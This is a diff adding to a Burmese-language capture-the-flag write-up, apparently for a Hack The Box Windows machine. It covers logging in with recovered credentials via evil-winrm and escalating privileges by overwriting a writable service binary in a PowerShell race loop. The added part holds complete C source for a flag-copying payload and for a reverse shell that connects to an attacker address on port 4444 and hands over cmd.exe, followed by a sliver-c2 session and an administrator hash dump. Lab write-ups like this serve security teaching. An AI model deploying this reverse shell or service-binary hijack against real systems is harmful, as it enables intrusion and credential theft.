@@ -10,6 +10,7 @@ cover = '/images/covers/bg2.webp'
 
 ဒီမှာဆိုရင် machine လေးစလိုက်ပြီးရင် ip ‌လေးရလာပါလိမ့်မယ် 
 
+
 > (.venv) ❰gh0st69❙~❱✔≻ ping 10.129.244.81
 ```bash
 PING 10.129.244.81 (10.129.244.81) 56(84) bytes of data.
@@ -343,3 +344,199 @@ if __name__ == "__main__":
 ဒါကတော့ windows ရဲ့ python.exe နဲ့ decrypt ထားတာပါ sliver-c2 ရဲ့ sharpchrome သုံးပြီး decrypt ထားတာလေးလည်းပြပါမယ် 
 
 ![image](/images/eloquia/22.jpg)
+
+အဲ့လိုနဲ့ ရလာတဲ့ cred ကို evil-winrm နဲ့ ၀င်ကြည့်လိုက်ရအောင်
+
+> evil-winrm -i machine_ip -u OLIVIA.KAT -p 'S3cureP@sswdIGu3ss'
+
+![image](/images/eloquia/24.jpg)
+
+boom! ၀င်လို့ရပါပြီ အဲ့ဒီတော့က directory တွေစစ်ကြည့်လိုက်ရအောင် 
+
+![image](/images/eloquia/25.jpg)
+
+App.config ဆိုတာကို တွေ့ပါလိမ့်မယ် Todo.txt ကို ဖွင့်လိုက်တဲ့အချိန် အဲ့လိုနဲ့ App.config file ကိုရှာလိုက်ရအောင်
+
+> Get-ChildItem -Path "C:\" -Recurse -File -Filter "App.config" -ErrorAction SilentlyContinue
+
+```bash
+Directory: C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        4/25/2024  11:32 AM            273 App.config
+```
+
+အပေါ်မှာ microsoftedgeupdate.exe ကိုတွေ့တဲ့အချိန်မှာ Failure2Ban.exe လည်း run နေတာကိုတွေ့ပါလိမ့်မယ် Failure2Ban.exe ကိုရှာလိုက်တဲ့အချိန်မှာ အဲ့ဒီ exe files ၃ခုလောက်ကို ကျနော်တွေ့ပါတယ် ဘယ်ဟာက service ကို run နေတာလဲဆိုတာ မသိရတော့  reg search နဲ့ရှာပါမယ် 
+
+> reg query HKLM\SYSTEM\CurrentControlSet\Services\Failure2Ban /v ImagePath
+
+```bash
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Failure2Ban ImagePath    REG_EXPAND_SZ    
+C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\Failure2Ban.exe
+```
+
+CurrentControlSet\Services ဆိုတာက windowsရဲ့ services တွေကို အဓိကထိန်းပေးတဲ့နေရာမလို့ပါ အဲ့ဒီတော့က Failure2Ban.exe ကဘယ်မှာ run နေတာလဲဆိုတာသိရပါပြီ အဲ့ဒိတော့ permission စစ်လိုက်ရအောင် 
+
+> icacls Failure2Ban.exe 
+
+```bash
+Failure2Ban.exe ELOQUIA\Olivia.KAT:(I)(RX,W)
+                NT AUTHORITY\SYSTEM:(I)(F)
+                BUILTIN\Administrators:(I)(F)
+                BUILTIN\Users:(I)(RX)
+                APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
+                APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
+```
+
+## Priv_Expl_Method1
+
+အဲ့ဒီတော့ ကျနော်တို့ရဲ့လက်ရှိ user Olivia.KAT က အဲ့ဒီ file ကို read write execute လုပ်လို့ရပါတယ် service file ဆိုတော့ သူ့ပါသာ auto run နေမှာဆိုတော့ သူမ run ခင် or ပြီးခင် အချိန်လေး အလိုမှာ ကျနော်တို့ overwrite ပါမယ် race condition vuln ပုံစံမျိုးပါ အဲ့ဒီတော့က အရင်ဆုံး flag ယူကြတာပေါ့ flag_taker.c
+
+```c
+#include <windows.h>
+#include <stdio.h>
+
+int main(void) {
+    STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    ZeroMemory(&pi, sizeof(pi));
+
+    // This command copy the Flag
+    LPSTR cmdLine = "C:\\Windows\\System32\\cmd.exe /c copy C:\\Users\\Administrator\\Desktop\\root.txt  C:\\programdata\\root.txt";
+
+    if (CreateProcess(
+            "C:\\Windows\\System32\\cmd.exe", // application
+            cmdLine,                                  // command line args
+            NULL,                                  // process attributes
+            NULL,                                  // thread attributes
+            FALSE,                                 // inherit handles
+            0,                                     // creation flags
+            NULL,                                  // environment
+            NULL,                                  // current directory
+            &si,                                   // startup info
+            &pi))                                   // process info
+    {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    } else {
+        printf("CreateProcess failed. Error: %lu\n", GetLastError());
+    }
+
+    return 0;
+}
+```
+
+ခုပေးထားတဲ့ file လေးကို exe compile ပြီး olivia.kat ရဲ့ documents ထဲမှာသွားတင်ပြီး သူ့ရဲ့နာမည်လေးကို Failure2Ban.exe ပြောင်းထားလိုက်ပါ အဲ့ဒီနောက် powershell script နဲ့ race condition လုပ်လိုက်ရအောင် race_trigger.ps1
+
+```powershell
+$source = "C:\Users\Olivia.KAT\Documents\Failure2Ban.exe"
+$target = "C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\Failure2Ban.exe"
+
+Write-Host "Trying to overwrite: $target"
+
+while ($true) {
+    try {
+        Copy-Item -Path $source -Destination $target -Force
+        Write-Host "[+] SUCCESS" -ForegroundColor Green
+        break
+    } catch {
+    }
+    Start-Sleep -Seconds 0.5
+}
+```
+
+ဒါလေးကို run လိုက်ပါ [+] SUCCESS လို့‌ပေါ်တဲ့အချိန်မှာ c:\programdata မှာ တစ်ချက်စစ်လိုက်ပါ 
+
+![image](/images/eloquia/26.jpg)
+
+## Priv_Expl_Method2
+
+boom! flag လေးကိုရနေတာတွေ့ရပါလိမ့်မယ် နောက်တစ်နည်းနဲ့ ထပ်စမ်းလိုက်ကြရအောင် reverse shell ယူပြီး sliver-c2 နဲ့ administrator hash dump ကြမယ် rev_shell.c
+
+```c
+#include <winsock2.h>
+#include <windows.h>
+#include <ws2tcpip.h>
+
+#pragma comment(lib, "Ws2_32.lib")
+
+int main() {
+    WSADATA wsaData;
+    SOCKET s;
+    struct sockaddr_in sa;
+    STARTUPINFOA si;
+    PROCESS_INFORMATION pi;
+
+    // Init Winsock
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
+        return 1;
+
+    // Create socket
+    s = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
+    if (s == INVALID_SOCKET)
+        return 1;
+
+    // Target
+    sa.sin_family = AF_INET;
+    sa.sin_port = htons(4444);
+    inet_pton(AF_INET, "10.10.16.xx", &sa.sin_addr);
+
+    // Connect
+    if (connect(s, (struct sockaddr*)&sa, sizeof(sa)) == 0) {
+
+        ZeroMemory(&si, sizeof(si));
+        ZeroMemory(&pi, sizeof(pi));
+
+        si.cb = sizeof(si);
+        si.dwFlags = STARTF_USESTDHANDLES;
+        si.hStdInput  = (HANDLE)s;
+        si.hStdOutput = (HANDLE)s;
+        si.hStdError  = (HANDLE)s;
+
+        // IMPORTANT: mutable string!
+        char cmd[] = "cmd.exe";
+
+        CreateProcessA(
+            NULL,
+            cmd,
+            NULL,
+            NULL,
+            TRUE,
+            0,
+            NULL,
+            NULL,
+            &si,
+            &pi
+        );
+
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    }
+
+    closesocket(s);
+    WSACleanup();
+    return 0;
+}
+```
+ip ချိန်းဖို့မမေ့ပါနဲ့ အပေါ်နည်းတူအတိုင်းပဲ rev_shell.c ကို Failure2Ban.exe ကို ပြောင်းမယ် ပြီးရင် race_trigger.ps1 သုံးမယ် အဲ့ဒီတော့က 
+
+![image](/images/eloquia/27.jpg)
+
+boom! [+] SUCCESS ဖြစ်တဲ့အချိန်မှာ reverse shell လေးရလာပါပြီ အဲ့ reverse shell ကိုသုံးပြီး sliver-c2 shell ထပ်ယူပါမယ် ဒီ machine မှာ antivirus detect တာတွေပါပါတယ် 
+
+![image](/images/eloquia/28.jpg)
+![image](/images/eloquia/29.jpg)
+
+boom! administrator hash လေးရလာပါပြီ သုံးကြည့်လိုက်ရအောင် administrator hash ကိုရမရ
+
+![image](/images/eloquia/30.jpg)
+
+boom! ကျနော်တို့ရဲ့ administrator hash ကသုံးလို့ရပါတယ် root flag လေးလည်းရပါပြီ အဆုံးထိ ဖတ်ပေးတဲ့အတွက် ကျေးဇူးပါဗျ :3
